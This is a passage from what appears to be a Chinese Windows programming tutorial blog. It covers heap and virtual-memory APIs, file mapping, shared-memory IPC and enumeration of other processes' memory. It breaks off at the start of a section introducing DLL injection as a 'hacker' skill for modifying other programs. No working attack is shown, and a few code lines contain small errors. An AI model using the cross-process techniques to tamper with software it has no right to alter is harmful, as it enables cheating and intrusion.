class="line">CloseHandle(hToken);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(fOk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><p>Windows系统使用虚拟内存的好处是什么</p><p>a)   无论物理内存实际有多大，每一个进程都有4GB的虚拟地址空间。<br>b)   每一个进程在虚拟地址空间的使用上都是相似的，低2GB是用户空间，高2GB是系统空间，低2GB的用户代码空间的代码无法访问高2GB系统空间。<br>c)   在进程中使用的全部都是虚拟地址，具体虚拟地址到物理地址的转换由操作系统内核完成，故而你无法在自己的进程中访问到其他进程的内存，虽然大家的地址长得如此类似。<br>d)   一个进程的虚拟空间只有使用一部分与物理内存有映射关系，并且windows尽量保证对于不同进程的同一份数据，在物理内存中只有一份，分别映射到多个进程中。从而节约内存。<br>e)   当各个进程所使用的内存数量超出物理内存的时候，操作系统还能够将物理内存中暂时用不到的数据交换到硬盘中。</p><h2 id="堆的管理"><a href="#堆的管理" class="headerlink" title="堆的管理"></a>堆的管理</h2><table><thead><tr><th>API</th><th>说明</th></tr></thead><tbody><tr><td>HeapCreate</td><td>在进程中创建一个堆，返回一个堆句柄</td></tr><tr><td>GetProcessHeap</td><td>获取当前进程中的一个堆，返回一个句柄</td></tr><tr><td>GetProcessHeaps</td><td>获取进程中的所用堆，堆的数量和堆的各个句柄</td></tr><tr><td>HeapAlloc</td><td>从指定的堆上分配块</td></tr><tr><td>HeapReAlloc</td><td>重新分配内存，改变已经分配好的堆内存块大小</td></tr><tr><td>GetSystemInfo</td><td>获取系统信息</td></tr><tr><td>HeapSize</td><td>获取指定堆的大小</td></tr><tr><td>HeapFree</td><td>释放HeapAlloc和HeapReAlloc申请的内存</td></tr><tr><td>HeapDestroy</td><td>销毁由HeapCreate创建的堆</td></tr><tr><td>CreateToolhelp32Snapshot</td><td>可以分别创建进程、线程、进程模块、进程堆的快照</td></tr><tr><td>Heap32First</td><td>用来首次调用，获得第一个堆对象的信息</td></tr><tr><td>Heap32Next</td><td>以后的调用由他来完成，不断的获取堆对象信息</td></tr></tbody></table><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//我们不创建堆，进程也会有默认的堆</span></span><br><span class="line">HANDLE      hHeap = GetProcessHeap(); <span class="comment">// 获取默认堆</span></span><br><span class="line">SYSTEM_INFO si;                       <span class="comment">//系统信息</span></span><br><span class="line">GetSystemInfo(&amp;si);                   <span class="comment">// 获取系统信息</span></span><br><span class="line"><span class="comment">//在堆上分配3个页面大小的内存</span></span><br><span class="line">LPVOID lpMem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, si.dwPageSize * <span class="number">3</span>);</span><br><span class="line">HeapFree(hHeap, <span class="number">0</span>, lpMem);</span><br><span class="line"><span class="comment">//默认堆，不应该去销毁它</span></span><br><span class="line"><span class="comment">//HeapDestroy( hHeap );</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Test();</span><br><span class="line"><span class="comment">//1 创建一个堆</span></span><br><span class="line">HANDLE      hHeap = HeapCreate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">SYSTEM_INFO si;     <span class="comment">//系统信息</span></span><br><span class="line">GetSystemInfo(&amp;si); <span class="comment">// 获取系统信息，主要是为了获取内存分页大小</span></span><br><span class="line"><span class="comment">//在堆上分配3个页面大小的内存</span></span><br><span class="line">LPVOID lpMem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, si.dwPageSize * <span class="number">3</span>);</span><br><span class="line"><span class="comment">//。。。。。</span></span><br><span class="line"><span class="comment">//释放堆内存</span></span><br><span class="line">HeapFree(hHeap, <span class="number">0</span>, lpMem);</span><br><span class="line"><span class="comment">//销毁堆，这个堆，没有任何需要使用的内存了，就销毁</span></span><br><span class="line">HeapDestroy(hHeap);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用场景：</p><p>一般情况下，咱么都是使用malloc或者new。如果有以下场景可以尝试使用堆，假如咱们的程序需要大量的去申请小块的内存，管理这些地址，就会比较麻烦，此时就可以使用自己创建的堆，在用完了内存之后，去直接销毁堆，此时内存就自动释放了，也就免去了挨个去释放的麻烦。</p><h3 id="遍历堆"><a href="#遍历堆" class="headerlink" title="遍历堆"></a>遍历堆</h3><p>和遍历进程，线程一致的，使用快照去遍历即可。</p><h2 id="虚拟内存管理函数"><a href="#虚拟内存管理函数" class="headerlink" title="虚拟内存管理函数"></a>虚拟内存管理函数</h2><table><thead><tr><th>作用</th><th>函数名</th><th>说明</th></tr></thead><tbody><tr><td>分配</td><td>VirtualAlloc</td><td>分配或预定一块虚拟内存</td></tr><tr><td></td><td>VirtualAllocEx</td><td>可以在其他进程分配或预定一块虚拟内存</td></tr><tr><td>释放</td><td>VirtualFree</td><td>将一块虚拟内存释放</td></tr><tr><td></td><td>VirtualFreeEX</td><td>可以将释放其他进程的内存</td></tr><tr><td>锁定与解锁</td><td>VirtualLook</td><td>可以将内存锁定，不能交换数据到硬盘</td></tr><tr><td></td><td>VirtualUnlook</td><td>为内存解锁</td></tr><tr><td>修改保护属性</td><td>VirtualProtect</td><td>修改一块虚拟内存的属性</td></tr><tr><td></td><td>VirtualProtectEx</td><td>可以修改其他内存的属性</td></tr><tr><td>读写其他进程内存</td><td>ReadProcessMemory</td><td>读写远程进程的内存数据</td></tr><tr><td></td><td>WriteProcessMemory</td><td>将数据写入远程进程内存</td></tr><tr><td>查询内存状态</td><td>VirtualQuery</td><td>查询内存状态</td></tr><tr><td></td><td>VirtualQueryEx</td><td>可以查询其他内存状态</td></tr></tbody></table><h3 id="安全属性"><a href="#安全属性" class="headerlink" title="安全属性"></a>安全属性</h3><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>PAGE_NOACCESS</td><td>0x01</td><td>不可访问</td></tr><tr><td>PAGE_READONLY</td><td>0x02</td><td>只读</td></tr><tr><td>PAGE_READWRITE</td><td>0x04</td><td>可读可写</td></tr><tr><td>PAGE_WRITECOPY</td><td>0x08</td><td>可写可读</td></tr><tr><td>PAGE_EXECUTE</td><td>0x10</td><td>可执行</td></tr><tr><td>PAGE_EXECUTE_READ</td><td>0x20</td><td>可读可执行</td></tr><tr><td>PAGE_EXECUTE_READWRITE</td><td>0x40</td><td>可读可写可执行</td></tr><tr><td>PAGE_EXECUTE_WRITECOPY</td><td>0x80</td><td>可执行，写时复制</td></tr><tr><td>PAGE_GUARD</td><td>0x100</td><td></td></tr><tr><td>PAGE_NOCACHE</td><td>0x200</td><td></td></tr><tr><td>PAGE_WRITECOMBINE</td><td>0x400</td><td></td></tr><tr><td>PAGE_GRAPHICS_NOACCESS</td><td>0x0800</td><td></td></tr><tr><td>PAGE_GRAPHICS_READONLY</td><td>0x1000</td><td></td></tr><tr><td>PAGE_GRAPHICS_READWRITE</td><td>0x2000</td><td></td></tr><tr><td>PAGE_GRAPHICS_EXECUTE</td><td>0x4000</td><td></td></tr><tr><td>PAGE_GRAPHICS_EXECUTE_READ</td><td>0x8000</td><td></td></tr><tr><td>PAGE_GRAPHICS_EXECUTE_READWRITE</td><td>0x10000</td><td></td></tr><tr><td>PAGE_GRAPHICS_COHERENT</td><td>0x20000</td><td></td></tr><tr><td>PAGE_ENCLAVE_THREAD_CONTROL</td><td>0x80000000</td><td></td></tr><tr><td>PAGE_REVERT_TO_FILE_MAP</td><td>0x80000000</td><td></td></tr><tr><td>PAGE_TARGETS_NO_UPDATE</td><td>0x40000000</td><td></td></tr><tr><td>PAGE_TARGETS_INVALID</td><td>0x40000000</td><td></td></tr><tr><td>PAGE_ENCLAVE_UNVALIDATED</td><td>0x20000000</td><td></td></tr><tr><td>PAGE_ENCLAVE_DECOMMIT</td><td>0x10000000</td><td></td></tr></tbody></table><h3 id="申请和释放"><a href="#申请和释放" class="headerlink" title="申请和释放"></a>申请和释放</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 申请</span></span><br><span class="line">LPVOID lpvResult = VirtualAlloc(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">4097</span>,              <span class="comment">// 4KB * 1</span></span><br><span class="line">MEM_RESERVE | MEM_COMMIT,   <span class="comment">// 预定并调拨内存</span></span><br><span class="line">PAGE_READWRITE);            <span class="comment">// 可读写</span></span><br><span class="line"><span class="comment">//使用</span></span><br><span class="line">wcscpy_s((LPWSTR)lpvResult, wcslen(<span class="string">L&quot;Hello!&quot;</span>)+<span class="number">2</span>, <span class="string">L&quot;World!&quot;</span>);</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, (LPWSTR)lpvResult, <span class="literal">NULL</span>, MB_OK);</span><br><span class="line"><span class="comment">//释放</span></span><br><span class="line">VirtualFree(lpvResult, <span class="number">1</span>, MEM_RELEASE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改保护属性"><a href="#修改保护属性" class="headerlink" title="修改保护属性"></a>修改保护属性</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* p = (<span class="keyword">char</span>*)<span class="string">&quot;hello World&quot;</span>;</span><br><span class="line">DWORD dwNewProtect = PAGE_READWRITE;</span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">VirtualProtect(p, <span class="number">1</span>, dwNewProtect, &amp;dwOldProtect);</span><br><span class="line">p[<span class="number">0</span>] = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">p[<span class="number">1</span>] = <span class="string">&#x27;k&#x27;</span>;</span><br><span class="line">p[<span class="number">2</span>] = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件映射"><a href="#文件映射" class="headerlink" title="文件映射"></a>文件映射</h2><p>可以将文件直接映射进内存的一种技术。</p><table><thead><tr><th>API</th><th>说明</th></tr></thead><tbody><tr><td>GetSystemInfo</td><td>获取系统信信息，用于确定分配粒度</td></tr><tr><td>CreateFileMapping</td><td>创建一个mapping对象</td></tr><tr><td>OpenFileMapping</td><td>打开已命名的mapping对象（可跨进程）</td></tr><tr><td>UnmapViewOfFile</td><td>取消文件映射</td></tr><tr><td>MapViewOfFile</td><td>将mapping对象的文件映射到内存</td></tr><tr><td>FlushViewOfFile</td><td>将映射到内存的文件写回到硬盘</td></tr></tbody></table><p>有两个作用：</p><p>1 操作文件比较方便</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 打开文件，得到一个文件句柄</span></span><br><span class="line">HANDLE hFile =  CreateFile(</span><br><span class="line"><span class="string">L&quot;D:\\test\\123.txt&quot;</span>,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="number">0</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2. 创建一个文件映射对象，和文件句柄关联如果，要超过文件大小的话</span></span><br><span class="line"><span class="comment">//   创建的时候，就需要写一个大小。</span></span><br><span class="line"><span class="comment">//   </span></span><br><span class="line">HANDLE hFileMapping  = </span><br><span class="line">CreateFileMapping(hFile, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//3. 将文件映射到内存</span></span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span>*)MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, <span class="number">0</span>,<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 读取或者写入</span></span><br><span class="line">strcpy_s(p, <span class="number">100</span>,<span class="string">&quot;15pb hello  15pb hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//5. 文件映射的写入，会自动刷，也可以手动刷 </span></span><br><span class="line">FlushViewOfFile(p, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//6. 关闭句柄</span></span><br><span class="line">CloseHandle(hFileMapping);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2 文件映射是一个内核对象，可以在多进程中去访问，所以文件映射也是一种进程间通讯机制。</p><h3 id="进程间通讯"><a href="#进程间通讯" class="headerlink" title="进程间通讯"></a>进程间通讯</h3><h4 id="通讯A端"><a href="#通讯A端" class="headerlink" title="通讯A端"></a>通讯A端</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 06_进程间通讯.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 创建文件映射</span></span><br><span class="line">HANDLE hFileMapping =</span><br><span class="line">CreateFileMapping(</span><br><span class="line">INVALID_HANDLE_VALUE, </span><br><span class="line"><span class="literal">NULL</span>, PAGE_READWRITE, </span><br><span class="line"><span class="number">0</span>, </span><br><span class="line"><span class="number">100</span>,</span><br><span class="line"><span class="string">L&quot;hello 15pb&quot;</span><span class="comment">//起了名字，别的进程才能打开它</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 映射内存</span></span><br><span class="line"><span class="keyword">char</span>* pBuf = (<span class="keyword">char</span>*)MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">pBuf[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3 时刻检测，第一个字节是否被修改了</span></span><br><span class="line"><span class="keyword">while</span> (pBuf[<span class="number">0</span>] == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4 如果被修改了，那么就结束</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;数据已经被更改&quot;</span>);</span><br><span class="line">CloseHandle(hFileMapping);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="通讯B端"><a href="#通讯B端" class="headerlink" title="通讯B端"></a>通讯B端</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 打开文件Mapping</span></span><br><span class="line">HANDLE hMapFile = OpenFileMapping(FILE_MAP_ALL_ACCESS,</span><br><span class="line">FALSE, <span class="string">L&quot;hello 15pb&quot;</span>);</span><br><span class="line"><span class="comment">//2. 映射到内存</span></span><br><span class="line"><span class="keyword">char</span>* pBuf = (<span class="keyword">char</span>*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS,</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//3. 修改数据</span></span><br><span class="line">pBuf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//4. 通讯完毕，退出</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;数据已经更改完毕了&quot;</span>);</span><br><span class="line">CloseHandle(hMapFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="虚拟内存的遍历"><a href="#虚拟内存的遍历" class="headerlink" title="虚拟内存的遍历"></a>虚拟内存的遍历</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SIZE_T WINAPI VirtualQueryEx(</span><br><span class="line">  _In_      HANDLE hProcess,   &#x2F;&#x2F; 进程句柄</span><br><span class="line">  _In_opt_  LPCVOID lpAddress, &#x2F;&#x2F; 查询地址</span><br><span class="line">  _Out_     PMEMORY_BASIC_INFORMATION lpBuffer,</span><br><span class="line">  _In_      SIZE_T dwLength    &#x2F;&#x2F; 传出结构体的大小</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MEMORY_BASIC_INFORMATION</span> &#123;</span></span><br><span class="line">  PVOID  BaseAddress;       <span class="comment">// 将参数向下取整到页面大小</span></span><br><span class="line">  PVOID  AllocationBase;    <span class="comment">// 区域地址，此区域包含传入地址</span></span><br><span class="line">  DWORD  AllocationProtect; <span class="comment">// 此区域在预定时的保护属性</span></span><br><span class="line">  SIZE_T RegionSize;        <span class="comment">// 区域的大小</span></span><br><span class="line">  DWORD  State;             <span class="comment">// 区域的页面状态[注1]</span></span><br><span class="line">  DWORD  Protect;           <span class="comment">// 页面保护属性</span></span><br><span class="line">  DWORD  Type;              <span class="comment">// 页面类型[注2]</span></span><br><span class="line">&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;</span><br></pre></td></tr></table></figure><h3 id="页面的状态"><a href="#页面的状态" class="headerlink" title="页面的状态"></a>页面的状态</h3><table><thead><tr><th><strong>状态</strong></th><th>值</th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>空闲的(Free)</td><td>0x00010000</td><td>进程不能访问这种页面，此页面还没有被分配。</td></tr><tr><td>保留的(reserve)</td><td>0x00002000</td><td>这个页面被预定了。但是还未与物理内存映射，因此这里也是不能访问的。</td></tr><tr><td>提交的(commit)</td><td>0x00001000</td><td>内存已经被分配了，并且也与物理存储器映射了，进程已经可以访问这里</td></tr></tbody></table><h3 id="页面类型"><a href="#页面类型" class="headerlink" title="页面类型"></a>页面类型</h3><table><thead><tr><th><strong>映射方式</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>private</td><td>进程私有内存,不被其他进程所<strong>共享</strong>, 一般是堆,栈</td></tr><tr><td>mapped</td><td>从别的进程内存映射而来</td></tr><tr><td>image</td><td>从程序的PE映像映射而来,一般是映像的区段.</td></tr></tbody></table><h3 id="遍历代码"><a href="#遍历代码" class="headerlink" title="遍历代码"></a>遍历代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnumProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnumVirtualMemroy</span><span class="params">(HANDLE Process)</span></span>;</span><br><span class="line">MEMORY_BASIC_INFORMATION VirtualMemroy;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">EnumProcess();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历进程</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnumProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">wstring</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个快照用于遍历进程，参数2可以留空</span></span><br><span class="line">HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 创建一个用于保存进程信息的结构体</span></span><br><span class="line">PROCESSENTRY32 ProcessInfo = &#123; <span class="keyword">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 尝试遍历第一个进程的信息，成功就继续，失败就跳过</span></span><br><span class="line"><span class="keyword">if</span> (Process32First(Snapshot, &amp;ProcessInfo))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">// 5.5.2 通过指定的权限获取进程句柄</span></span><br><span class="line">HANDLE Process = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE, ProcessInfo.th32ProcessID);</span><br><span class="line"><span class="keyword">if</span> (Process&amp;&amp; Process != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 5.5.3 通过API查询到进程对应的Exe的路径，获取不到是因为权限不够</span></span><br><span class="line"><span class="comment">//QueryFullProcessImageName(Process, 0, ImagePath, &amp;PathSize);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ls\n&quot;</span>, ProcessInfo.szExeFile);</span><br><span class="line">EnumVirtualMemroy(Process);</span><br><span class="line"><span class="comment">// 5.5.4 关闭句柄并打印数据</span></span><br><span class="line">CloseHandle(Process);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 尝试遍历进程快照内的下一个进程</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Process32Next(Snapshot, &amp;ProcessInfo));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//虚拟内存的遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnumVirtualMemroy</span><span class="params">(HANDLE Process)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> dwLength = <span class="keyword">sizeof</span>(MEMORY_BASIC_INFORMATION);</span><br><span class="line">LPVOID Base = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">while</span> (Base&lt;(LPVOID)<span class="number">0x7fffffff</span>)</span><br><span class="line">&#123;</span><br><span class="line">VirtualQueryEx(Process, Base, &amp;VirtualMemroy, dwLength);</span><br><span class="line"></span><br><span class="line">Base = (LPVOID)((DWORD)Base + VirtualMemroy.RegionSize);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t类型：%d\t属性：%d\t状态：%d\t大小：%d\n&quot;</span>,</span><br><span class="line">VirtualMemroy.Type,</span><br><span class="line">VirtualMemroy.AllocationProtect,</span><br><span class="line">VirtualMemroy.State,</span><br><span class="line">VirtualMemroy.RegionSize</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Dll注入"><a href="#Dll注入" class="headerlink" title="Dll注入"></a>Dll注入</h1><p>注：职业黑客的必修课</p><p>重点内容）</p><p>1  什么是DLL注入？？为什么要DLL注入？？</p><p>  在一个本来不需要加载此DLL的进程中，强行的使其加载此DLL文件。那么这个就叫做DLL注入技术。</p><p>  我们在向一个进程中注入我们自己的DLL，相当于在对方的进程中加入了我们自己的代码，可以修改对方程序的功能。</p><p>  游戏辅助，输入法，对于软件行为的拦截。</p><p>2  